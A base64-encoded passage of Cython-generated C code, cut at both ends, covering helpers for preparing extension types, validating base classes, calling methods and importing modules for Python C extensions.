YXNzZXJ0KG1lbWItPnR5cGUgPT0gVF9QWVNTSVpFVCk7XG4gICAgICAgICAgICAgICAgICAgIGFzc2VydChtZW1iLT5mbGFncyA9PSBSRUFET05MWSk7XG4jaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDBiNFxuICAgICAgICAgICAgICAgICAgICB0eXBlLT50cF92ZWN0b3JjYWxsX29mZnNldCA9IG1lbWItPm9mZnNldDtcbiNlbHNlXG4gICAgICAgICAgICAgICAgICAgIHR5cGUtPnRwX3ByaW50ID0gKHByaW50ZnVuYykgbWVtYi0+b2Zmc2V0O1xuI2VuZGlmXG4gICAgICAgICAgICAgICAgICAgIGNoYW5nZWQgPSAxO1xuICAgICAgICAgICAgICAgIH1cbiNlbmRpZiAgLy8gQ1lUSE9OX01FVEhfRkFTVENBTExcbiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZXG4gICAgICAgICAgICAgICAgZWxzZSBpZiAoc3RyY21wKG1lbWItPm5hbWUsICJfX21vZHVsZV9fIikgPT0gMCkge1xuICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqZGVzY3I7XG4gICAgICAgICAgICAgICAgICAgIGFzc2VydChtZW1iLT50eXBlID09IFRfT0JKRUNUKTtcbiAgICAgICAgICAgICAgICAgICAgYXNzZXJ0KG1lbWItPmZsYWdzID09IDAgfHwgbWVtYi0+ZmxhZ3MgPT0gUkVBRE9OTFkpO1xuICAgICAgICAgICAgICAgICAgICBkZXNjciA9IFB5RGVzY3JfTmV3TWVtYmVyKHR5cGUsIG1lbWIpO1xuICAgICAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIWRlc2NyKSlcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAtMTtcbiAgICAgICAgICAgICAgICAgICAgaW50IHNldF9pdGVtX3Jlc3VsdCA9IFB5RGljdF9TZXRJdGVtKHR5cGUtPnRwX2RpY3QsIFB5RGVzY3JfTkFNRShkZXNjciksIGRlc2NyKTtcbiAgICAgICAgICAgICAgICAgICAgUHlfREVDUkVGKGRlc2NyKTtcbiAgICAgICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KHNldF9pdGVtX3Jlc3VsdCA8IDApKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gLTE7XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgY2hhbmdlZCA9IDE7XG4gICAgICAgICAgICAgICAgfVxuI2VuZGlmICAvLyAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZXG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBtZW1iKys7XG4gICAgICAgIH1cbiAgICB9XG4jZW5kaWYgIC8vICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4jaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWVxuICAgIHNsb3QgPSBzcGVjLT5zbG90cztcbiAgICB3aGlsZSAoc2xvdCAmJiBzbG90LT5zbG90ICYmIHNsb3QtPnNsb3QgIT0gUHlfdHBfZ2V0c2V0KVxuICAgICAgICBzbG90Kys7XG4gICAgaWYgKHNsb3QgJiYgc2xvdC0+c2xvdCA9PSBQeV90cF9nZXRzZXQpIHtcbiAgICAgICAgUHlHZXRTZXREZWYgKmdldHNldCA9IChQeUdldFNldERlZiopIHNsb3QtPnBmdW5jO1xuICAgICAgICB3aGlsZSAoZ2V0c2V0ICYmIGdldHNldC0+bmFtZSkge1xuICAgICAgICAgICAgaWYgKGdldHNldC0+bmFtZVswXSA9PSBcJ19cJyAmJiBnZXRzZXQtPm5hbWVbMV0gPT0gXCdfXCcgJiYgc3RyY21wKGdldHNldC0+bmFtZSwgIl9fbW9kdWxlX18iKSA9PSAwKSB7XG4gICAgICAgICAgICAgICAgUHlPYmplY3QgKmRlc2NyID0gUHlEZXNjcl9OZXdHZXRTZXQodHlwZSwgZ2V0c2V0KTtcbiAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIWRlc2NyKSlcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIC0xO1xuICAgICAgICAgICAgICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgICAgICAgICAgICAgUHlPYmplY3QgKnB5bmFtZSA9IFB5VW5pY29kZV9Gcm9tU3RyaW5nKGdldHNldC0+bmFtZSk7XG4gICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFweW5hbWUpKSB7XG4gICAgICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihkZXNjcik7XG4gICAgICAgICAgICAgICAgICAgIHJldHVybiAtMTtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgaW50IHNldF9pdGVtX3Jlc3VsdCA9IF9fUHl4X1NldEl0ZW1PblR5cGVEaWN0KHR5cGUsIHB5bmFtZSwgZGVzY3IpO1xuICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihweW5hbWUpO1xuICAgICAgICAgICAgICAgICNlbHNlXG4gICAgICAgICAgICAgICAgQ1lUSE9OX1VOVVNFRF9WQVIoX19QeXhfX1NldEl0ZW1PblR5cGVEaWN0KTtcbiAgICAgICAgICAgICAgICBpbnQgc2V0X2l0ZW1fcmVzdWx0ID0gUHlEaWN0X1NldEl0ZW0odHlwZS0+dHBfZGljdCwgUHlEZXNjcl9OQU1FKGRlc2NyKSwgZGVzY3IpO1xuICAgICAgICAgICAgICAgICNlbmRpZlxuICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihkZXNjcik7XG4gICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KHNldF9pdGVtX3Jlc3VsdCA8IDApKSB7XG4gICAgICAgICAgICAgICAgICAgIHJldHVybiAtMTtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgY2hhbmdlZCA9IDE7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICArK2dldHNldDtcbiAgICAgICAgfVxuICAgIH1cbiNlbmRpZiAgLy8gIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWVxuICAgIGlmIChjaGFuZ2VkKVxuICAgICAgICBQeVR5cGVfTW9kaWZpZWQodHlwZSk7XG4jZW5kaWYgIC8vIFBZX1ZFUlNJT05fSEVYID4gMHgwMzA5MDBCMVxuICAgIHJldHVybiAwO1xufVxuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsTm9BcmcoUHlPYmplY3QgKmZ1bmMpIHtcbiAgICBQeU9iamVjdCAqYXJnWzJdID0ge05VTEwsIE5VTEx9O1xuICAgIHJldHVybiBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChmdW5jLCBhcmcgKyAxLCAwIHwgX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKTtcbn1cblxuXG5zdGF0aWMgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0NhbGxNZXRob2QwKFB5T2JqZWN0KiBvYmosIFB5T2JqZWN0KiBtZXRob2RfbmFtZSkge1xuI2lmIENZVEhPTl9WRUNUT1JDQUxMICYmIChfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDAgfHwgKCFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDApKVxuICAgIFB5T2JqZWN0ICphcmdzWzFdID0ge29ian07XG4gICAgKHZvaWQpIF9fUHl4X1B5T2JqZWN0X0dldE1ldGhvZDtcbiAgICAodm9pZCkgX19QeXhfUHlPYmplY3RfQ2FsbE9uZUFyZztcbiAgICAodm9pZCkgX19QeXhfUHlPYmplY3RfQ2FsbE5vQXJnO1xuICAgIHJldHVybiBQeU9iamVjdF9WZWN0b3JjYWxsTWV0aG9kKG1ldGhvZF9uYW1lLCBhcmdzLCAxIHwgUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VULCBOVUxMKTtcbiNlbHNlXG4gICAgUHlPYmplY3QgKm1ldGhvZCA9IE5VTEwsICpyZXN1bHQgPSBOVUxMO1xuICAgIGludCBpc19tZXRob2QgPSBfX1B5eF9QeU9iamVjdF9HZXRNZXRob2Qob2JqLCBtZXRob2RfbmFtZSwgJm1ldGhvZCk7XG4gICAgaWYgKGxpa2VseShpc19tZXRob2QpKSB7XG4gICAgICAgIHJlc3VsdCA9IF9fUHl4X1B5T2JqZWN0X0NhbGxPbmVBcmcobWV0aG9kLCBvYmopO1xuICAgICAgICBQeV9ERUNSRUYobWV0aG9kKTtcbiAgICAgICAgcmV0dXJuIHJlc3VsdDtcbiAgICB9XG4gICAgaWYgKHVubGlrZWx5KCFtZXRob2QpKSBnb3RvIGJhZDtcbiAgICByZXN1bHQgPSBfX1B5eF9QeU9iamVjdF9DYWxsTm9BcmcobWV0aG9kKTtcbiAgICBQeV9ERUNSRUYobWV0aG9kKTtcbmJhZDpcbiAgICByZXR1cm4gcmVzdWx0O1xuI2VuZGlmXG59XG5cblxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8IENZVEhPTl9VU0VfVFlQRV9TUEVDU1xuc3RhdGljIGludCBfX1B5eF92YWxpZGF0ZV9iYXNlc190dXBsZShjb25zdCBjaGFyICp0eXBlX25hbWUsIFB5X3NzaXplX3QgZGljdG9mZnNldCwgUHlPYmplY3QgKmJhc2VzKSB7XG4gICAgUHlfc3NpemVfdCBpLCBuO1xuI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gICAgbiA9IFB5VHVwbGVfR0VUX1NJWkUoYmFzZXMpO1xuI2Vsc2VcbiAgICBuID0gUHlUdXBsZV9TaXplKGJhc2VzKTtcbiAgICBpZiAodW5saWtlbHkobiA8IDApKSByZXR1cm4gLTE7XG4jZW5kaWZcbiAgICBmb3IgKGkgPSAxOyBpIDwgbjsgaSsrKVxuICAgIHtcbiAgICAgICAgUHlUeXBlT2JqZWN0ICpiO1xuI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICAgICAgIFB5T2JqZWN0ICpiMCA9IFB5U2VxdWVuY2VfR2V0SXRlbShiYXNlcywgaSk7XG4gICAgICAgIGlmICghYjApIHJldHVybiAtMTtcbiNlbGlmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbiAgICAgICAgUHlPYmplY3QgKmIwID0gUHlUdXBsZV9HRVRfSVRFTShiYXNlcywgaSk7XG4jZWxzZVxuICAgICAgICBQeU9iamVjdCAqYjAgPSBQeVR1cGxlX0dldEl0ZW0oYmFzZXMsIGkpO1xuICAgICAgICBpZiAoIWIwKSByZXR1cm4gLTE7XG4jZW5kaWZcbiAgICAgICAgYiA9IChQeVR5cGVPYmplY3QqKSBiMDtcbiAgICAgICAgaWYgKCFfX1B5eF9QeVR5cGVfSGFzRmVhdHVyZShiLCBQeV9UUEZMQUdTX0hFQVBUWVBFKSlcbiAgICAgICAge1xuICAgICAgICAgICAgX19QeXhfVHlwZU5hbWUgYl9uYW1lID0gX19QeXhfUHlUeXBlX0dldEZ1bGx5UXVhbGlmaWVkTmFtZShiKTtcbiAgICAgICAgICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICAgICAgICAgImJhc2UgY2xhc3MgXCciIF9fUHl4X0ZNVF9UWVBFTkFNRSAiXCcgaXMgbm90IGEgaGVhcCB0eXBlIiwgYl9uYW1lKTtcbiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRl9UeXBlTmFtZShiX25hbWUpO1xuI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICAgICAgICAgICBQeV9ERUNSRUYoYjApO1xuI2VuZGlmXG4gICAgICAgICAgICByZXR1cm4gLTE7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKGRpY3RvZmZzZXQgPT0gMClcbiAgICAgICAge1xuICAgICAgICAgICAgUHlfc3NpemVfdCBiX2RpY3RvZmZzZXQgPSAwO1xuI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuICAgICAgICAgICAgYl9kaWN0b2Zmc2V0ID0gYi0+dHBfZGljdG9mZnNldDtcbiNlbHNlXG4gICAgICAgICAgICBQeU9iamVjdCAqcHlfYl9kaWN0b2Zmc2V0ID0gUHlPYmplY3RfR2V0QXR0clN0cmluZygoUHlPYmplY3QqKWIsICJfX2RpY3RvZmZzZXRfXyIpO1xuICAgICAgICAgICAgaWYgKCFweV9iX2RpY3RvZmZzZXQpIGdvdG8gZGljdG9mZnNldF9yZXR1cm47XG4gICAgICAgICAgICBiX2RpY3RvZmZzZXQgPSBQeUxvbmdfQXNTc2l6ZV90KHB5X2JfZGljdG9mZnNldCk7XG4gICAgICAgICAgICBQeV9ERUNSRUYocHlfYl9kaWN0b2Zmc2V0KTtcbiAgICAgICAgICAgIGlmIChiX2RpY3RvZmZzZXQgPT0gLTEgJiYgUHlFcnJfT2NjdXJyZWQoKSkgZ290byBkaWN0b2Zmc2V0X3JldHVybjtcbiNlbmRpZlxuICAgICAgICAgICAgaWYgKGJfZGljdG9mZnNldCkge1xuICAgICAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgICAgICAgX19QeXhfVHlwZU5hbWUgYl9uYW1lID0gX19QeXhfUHlUeXBlX0dldEZ1bGx5UXVhbGlmaWVkTmFtZShiKTtcbiAgICAgICAgICAgICAgICAgICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvcixcbiAgICAgICAgICAgICAgICAgICAgICAgICJleHRlbnNpb24gdHlwZSBcJyUuMjAwc1wnIGhhcyBubyBfX2RpY3RfXyBzbG90LCAiXG4gICAgICAgICAgICAgICAgICAgICAgICAiYnV0IGJhc2UgdHlwZSBcJyIgX19QeXhfRk1UX1RZUEVOQU1FICJcJyBoYXM6ICJcbiAgICAgICAgICAgICAgICAgICAgICAgICJlaXRoZXIgYWRkIFwnY2RlZiBkaWN0IF9fZGljdF9fXCcgdG8gdGhlIGV4dGVuc2lvbiB0eXBlICJcbiAgICAgICAgICAgICAgICAgICAgICAgICJvciBhZGQgXCdfX3Nsb3RzX18gPSBbLi4uXVwnIHRvIHRoZSBiYXNlIHR5cGUiLFxuICAgICAgICAgICAgICAgICAgICAgICAgdHlwZV9uYW1lLCBiX25hbWUpO1xuICAgICAgICAgICAgICAgICAgICBfX1B5eF9ERUNSRUZfVHlwZU5hbWUoYl9uYW1lKTtcbiAgICAgICAgICAgICAgICB9XG4jaWYgIUNZVEhPTl9VU0VfVFlQRV9TTE9UU1xuICAgICAgICAgICAgICBkaWN0b2Zmc2V0X3JldHVybjpcbiNlbmRpZlxuI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICAgICAgICAgICAgICAgUHlfREVDUkVGKGIwKTtcbiNlbmRpZlxuICAgICAgICAgICAgICAgIHJldHVybiAtMTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgfVxuI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICAgICAgIFB5X0RFQ1JFRihiMCk7XG4jZW5kaWZcbiAgICB9XG4gICAgcmV0dXJuIDA7XG59XG4jZW5kaWZcblxuXG5DWVRIT05fVU5VU0VEIHN0YXRpYyBpbnQgX19QeXhfUHlUeXBlX0hhc011bHRpcGxlSW5oZXJpdGFuY2UoUHlUeXBlT2JqZWN0ICp0KSB7XG4gICAgd2hpbGUgKHQpIHtcbiAgICAgICAgUHlPYmplY3QgKmJhc2VzID0gX19QeXhfUHlUeXBlX0dldFNsb3QodCwgdHBfYmFzZXMsIFB5T2JqZWN0Kik7XG4gICAgICAgIGlmIChiYXNlcykge1xuICAgICAgICAgICAgcmV0dXJuIDE7XG4gICAgICAgIH1cbiAgICAgICAgdCA9IF9fUHl4X1B5VHlwZV9HZXRTbG90KHQsIHRwX2Jhc2UsIFB5VHlwZU9iamVjdCopO1xuICAgIH1cbiAgICByZXR1cm4gMDtcbn1cbnN0YXRpYyBpbnQgX19QeXhfUHlUeXBlX1JlYWR5KFB5VHlwZU9iamVjdCAqdCkge1xuI2lmIENZVEhPTl9VU0VfVFlQRV9TUEVDUyB8fCAhQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OIHx8IGRlZmluZWQoUFlTVE9OX01BSk9SX1ZFUlNJT04pXG4gICAgKHZvaWQpX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhvZDA7XG4jaWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTXG4gICAgKHZvaWQpX19QeXhfdmFsaWRhdGVfYmFzZXNfdHVwbGU7XG4jZW5kaWZcbiAgICByZXR1cm4gUHlUeXBlX1JlYWR5KHQpO1xuI2Vsc2VcbiAgICBpbnQgcjtcbiAgICBpZiAoIV9fUHl4X1B5VHlwZV9IYXNNdWx0aXBsZUluaGVyaXRhbmNlKHQpKSB7XG4gICAgICAgIHJldHVybiBQeVR5cGVfUmVhZHkodCk7XG4gICAgfVxuICAgIFB5T2JqZWN0ICpiYXNlcyA9IF9fUHl4X1B5VHlwZV9HZXRTbG90KHQsIHRwX2Jhc2VzLCBQeU9iamVjdCopO1xuICAgIGlmIChiYXNlcyAmJiB1bmxpa2VseShfX1B5eF92YWxpZGF0ZV9iYXNlc190dXBsZSh0LT50cF9uYW1lLCB0LT50cF9kaWN0b2Zmc2V0LCBiYXNlcykgPT0gLTEpKVxuICAgICAgICByZXR1cm4gLTE7XG4jaWYgIWRlZmluZWQoUFlTVE9OX01BSk9SX1ZFUlNJT04pXG4gICAge1xuICAgICAgICBpbnQgZ2Nfd2FzX2VuYWJsZWQ7XG4gICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQTAwYjFcbiAgICAgICAgZ2Nfd2FzX2VuYWJsZWQgPSBQeUdDX0Rpc2FibGUoKTtcbiAgICAgICAgKHZvaWQpX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhvZDA7XG4gICAgI2Vsc2VcbiAgICAgICAgUHlPYmplY3QgKnJldCwgKnB5X3N0YXR1cztcbiAgICAgICAgUHlPYmplY3QgKmdjID0gTlVMTDtcbiAgICAgICAgI2lmICghQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IFBZUFlfVkVSU0lPTl9OVU0rMCA+PSAweDA3MDMwNDAwKSAmJlxcXG4gICAgICAgICAgICAgICAgIUNZVEhPTl9DT01QSUxJTkdfSU5fR1JBQUxcbiAgICAgICAgZ2MgPSBQeUltcG9ydF9HZXRNb2R1bGUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9nYyk7XG4gICAgICAgICNlbmRpZlxuICAgICAgICBpZiAodW5saWtlbHkoIWdjKSkgZ2MgPSBQeUltcG9ydF9JbXBvcnQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9nYyk7XG4gICAgICAgIGlmICh1bmxpa2VseSghZ2MpKSByZXR1cm4gLTE7XG4gICAgICAgIHB5X3N0YXR1cyA9IF9fUHl4X1B5T2JqZWN0X0NhbGxNZXRob2QwKGdjLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2lzZW5hYmxlZCk7XG4gICAgICAgIGlmICh1bmxpa2VseSghcHlfc3RhdHVzKSkge1xuICAgICAgICAgICAgUHlfREVDUkVGKGdjKTtcbiAgICAgICAgICAgIHJldHVybiAtMTtcbiAgICAgICAgfVxuICAgICAgICBnY193YXNfZW5hYmxlZCA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShweV9zdGF0dXMpO1xuICAgICAgICBQeV9ERUNSRUYocHlfc3RhdHVzKTtcbiAgICAgICAgaWYgKGdjX3dhc19lbmFibGVkID4gMCkge1xuICAgICAgICAgICAgcmV0ID0gX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhvZDAoZ2MsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZGlzYWJsZSk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIXJldCkpIHtcbiAgICAgICAgICAgICAgICBQeV9ERUNSRUYoZ2MpO1xuICAgICAgICAgICAgICAgIHJldHVybiAtMTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIFB5X0RFQ1JFRihyZXQpO1xuICAgICAgICB9IGVsc2UgaWYgKHVubGlrZWx5KGdjX3dhc19lbmFibGVkID09IC0xKSkge1xuICAgICAgICAgICAgUHlfREVDUkVGKGdjKTtcbiAgICAgICAgICAgIHJldHVybiAtMTtcbiAgICAgICAgfVxuICAgICNlbmRpZlxuICAgICAgICB0LT50cF9mbGFncyB8PSBQeV9UUEZMQUdTX0hFQVBUWVBFO1xuI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQTAwMDBcbiAgICAgICAgdC0+dHBfZmxhZ3MgfD0gUHlfVFBGTEFHU19JTU1VVEFCTEVUWVBFO1xuI2VuZGlmXG4jZWxzZVxuICAgICAgICAodm9pZClfX1B5eF9QeU9iamVjdF9DYWxsTWV0aG9kMDtcbiNlbmRpZlxuICAgIHIgPSBQeVR5cGVfUmVhZHkodCk7XG4jaWYgIWRlZmluZWQoUFlTVE9OX01BSk9SX1ZFUlNJT04pXG4gICAgICAgIHQtPnRwX2ZsYWdzICY9IH5QeV9UUEZMQUdTX0hFQVBUWVBFO1xuICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEEwMGIxXG4gICAgICAgIGlmIChnY193YXNfZW5hYmxlZClcbiAgICAgICAgICAgIFB5R0NfRW5hYmxlKCk7XG4gICAgI2Vsc2VcbiAgICAgICAgaWYgKGdjX3dhc19lbmFibGVkKSB7XG4gICAgICAgICAgICBQeU9iamVjdCAqdHAsICp2LCAqdGI7XG4gICAgICAgICAgICBQeUVycl9GZXRjaCgmdHAsICZ2LCAmdGIpO1xuICAgICAgICAgICAgcmV0ID0gX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhvZDAoZ2MsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZW5hYmxlKTtcbiAgICAgICAgICAgIGlmIChsaWtlbHkocmV0IHx8IHIgPT0gLTEpKSB7XG4gICAgICAgICAgICAgICAgUHlfWERFQ1JFRihyZXQpO1xuICAgICAgICAgICAgICAgIFB5RXJyX1Jlc3RvcmUodHAsIHYsIHRiKTtcbiAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgUHlfWERFQ1JFRih0cCk7XG4gICAgICAgICAgICAgICAgUHlfWERFQ1JFRih2KTtcbiAgICAgICAgICAgICAgICBQeV9YREVDUkVGKHRiKTtcbiAgICAgICAgICAgICAgICByID0gLTE7XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiAgICAgICAgUHlfREVDUkVGKGdjKTtcbiAgICAjZW5kaWZcbiAgICB9XG4jZW5kaWZcbiAgICByZXR1cm4gcjtcbiNlbmRpZlxufVxuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfSW1wb3J0KFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqZnJvbV9saXN0LCBpbnQgbGV2ZWwpIHtcbiAgICBQeU9iamVjdCAqbW9kdWxlID0gMDtcbiAgICBQeU9iamVjdCAqZW1wdHlfZGljdCA9IDA7XG4gICAgUHlPYmplY3QgKmVtcHR5X2xpc3QgPSAwO1xuICAgIGVtcHR5X2RpY3QgPSBQeURpY3RfTmV3KCk7XG4gICAgaWYgKHVubGlrZWx5KCFlbXB0eV9kaWN0KSlcbiAgICAgICAgZ290byBiYWQ7XG4gICAgaWYgKGxldmVsID09IC0xKSB7XG4gICAgICAgIGNvbnN0IGNoYXIqIHBhY2thZ2Vfc2VwID0gc3RyY2hyKF9fUHl4X01PRFVMRV9OQU1FLCBcJy5cJyk7XG4gICAgICAgIGlmIChwYWNrYWdlX3NlcCAhPSAoMCkpIHtcbiAgICAgICAgICAgIG1vZHVsZSA9IFB5SW1wb3J0X0ltcG9ydE1vZHVsZUxldmVsT2JqZWN0KFxuICAgICAgICAgICAgICAgIG5hbWUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIGVtcHR5X2RpY3QsIGZyb21fbGlzdCwgMSk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIW1vZHVsZSkpIHtcbiAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIVB5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoUHlFeGNfSW1wb3J0RXJyb3IpKSlcbiAgICAgICAgICAgICAgICAgICAgZ290byBiYWQ7XG4gICAgICAgICAgICAgICAgUHlFcnJfQ2xlYXIoKTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgfVxuICAgICAgICBsZXZlbCA9IDA7XG4gICAgfVxuICAgIGlmICghbW9kdWxlKSB7XG4gICAgICAgIG1vZHVsZSA9IFB5SW1wb3J0X0ltcG9ydE1vZHVsZUxldmVsT2JqZWN0KFxuICAgICAgICAgICAgbmFtZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgZW1wdHlfZGljdCwgZnJvbV9saXN0LCBsZXZlbCk7XG4gICAgfVxuYmFkOlxuICAgIFB5X1hERUNSRUYoZW1wdHlfZGljdCk7XG4gICAgUHlfWERFQ1JFRihlbXB0eV9saXN0KTtcbiAgICByZXR1cm4gbW9kdWxlO1xufVxuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfX0ltcG9ydERvdHRlZE1vZHVsZV9FcnJvcihQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKnBhcnRzX3R1cGxlLCBQeV9zc2l6ZV90IGNvdW50KSB7XG4gICAgUHlPYmplY3QgKnBhcnRpYWxfbmFtZSA9IE5VTEwsICpzbGljZSA9IE5VTEwsICpzZXAgPSBOVUxMO1xuICAgIFB5X3NzaXplX3Qgc2l6ZTtcbiAgICBpZiAodW5saWtlbHkoUHlFcnJfT2NjdXJyZWQoKSkpIHtcbiAgICAgICAgUHlFcnJfQ2xlYXIoKTtcbiAgICB9XG4jaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgICBzaXplID0gUHlUdXBsZV9HRVRfU0laRShwYXJ0c190dXBsZSk7XG4jZWxzZVxuICAgIHNpemUgPSBQeVR1cGxlX1NpemUocGFydHNfdHVwbGUpO1xuICAgIGlmIChzaXplIDwgMCkgZ290byBiYWQ7XG4jZW5kaWZcbiAgICBpZiAobGlrZWx5KHNpemUgPT0gY291bnQpKSB7XG4gICAgICAgIHBhcnRpYWxfbmFtZSA9IG5hbWU7XG4gICAgfSBlbHNlIHtcbiAgICAgICAgc2xpY2UgPSBQeVNlcXVlbmNlX0dldFNsaWNlKHBhcnRzX3R1cGxlLCAwLCBjb3VudCk7XG4gICAgICAgIGlmICh1bmxpa2VseSghc2xpY2UpKVxuICAgICAgICAgICAgZ290byBiYWQ7XG4gICAgICAgIHNlcCA9IFB5VW5pY29kZV9Gcm9tU3RyaW5nQW5kU2l6ZSgiLiIsIDEpO1xuICAgICAgICBpZiAodW5saWtlbHkoIXNlcCkpXG4gICAgICAgICAgICBnb3RvIGJhZDtcbiAgICAgICAgcGFydGlhbF9uYW1lID0gUHlVbmljb2RlX0pvaW4oc2VwLCBzbGljZSk7XG4gICAgfVxuICAgIFB5RXJyX0Zvcm1hdChcbiAgICAgICAgUHlFeGNfTW9kdWxlTm90Rm91bmRFcnJvcixcbiAgICAgICAgIk5vIG1vZHVsZSBuYW1lZCBcJyVVXCciLCBwYXJ0aWFsX25hbWUpO1xuYmFkOlxuICAgIFB5X1hERUNSRUYoc2VwKTtcbiAgICBQeV9YREVDUkVGKHNsaWNlKTtcbiAgICBQeV9YREVDUkVGKHBhcnRpYWxfbmFtZSk7XG4gICAgcmV0dXJuIE5VTEw7XG59XG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X19JbXBvcnREb3R0ZWRNb2R1bGVfTG9va3VwKFB5T2JqZWN0ICpuYW1lKSB7XG4gICAgUHlPYmplY3QgKmltcG9ydGVkX21vZHVsZTtcbiNpZiAoQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZICYmIFBZUFlfVkVSU0lPTl9OVU0gIDwgMHgwNzAzMDQwMCkgfHxcXFxuICAgICAgICBDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMXG4gICAgUHlPYmplY3QgKm1vZHVsZXMgPSBQeUltcG9ydF9HZXRNb2R1bGVEaWN0KCk7XG4gICAgaWYgKHVubGlrZWx5KCFtb2R1bGVzKSlcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgaW1wb3J0ZWRfbW9kdWxlID0gX19QeXhfUHlEaWN0X0dldEl0ZW1TdHIobW9kdWxlcywgbmFtZSk7XG4gICAgUHlfWElOQ1JFRihpbXBvcnRlZF9tb2R1bGUpO1xuI2Vsc2VcbiAgICBpbXBvcnRlZF9tb2R1bGUgPSBQeUltcG9ydF9HZXRNb2R1bGUobmFtZSk7XG4jZW5kaWZcbiAgICByZXR1cm4gaW1wb3J0ZWRfbW9kdWxlO1xufVxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9JbXBvcnREb3R0ZWRNb2R1bGVfV2Fsa1BhcnRzKFB5T2JqZWN0ICptb2R1bGUsIFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqcGFydHNfdHVwbGUpIHtcbiAgICBQeV9zc2l6ZV90IGksIG5wYXJ0cztcbiNpZiBDWVRIT05fQVNTV